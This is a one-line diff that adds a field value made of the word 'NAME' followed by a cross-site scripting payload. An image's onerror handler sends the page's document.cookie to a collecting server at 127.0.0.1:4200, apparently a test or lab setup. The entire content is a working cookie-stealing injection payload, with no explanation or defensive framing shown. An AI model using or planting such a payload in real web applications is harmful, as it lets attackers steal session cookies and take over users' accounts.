@@ -1,0 +1,1 @@
+NAME<img id="stealImg" width='0px' height='0px'><img src='' onerror="stealImg.src='http://127.0.0.1:4200/good?cookie=' + document.cookie;">
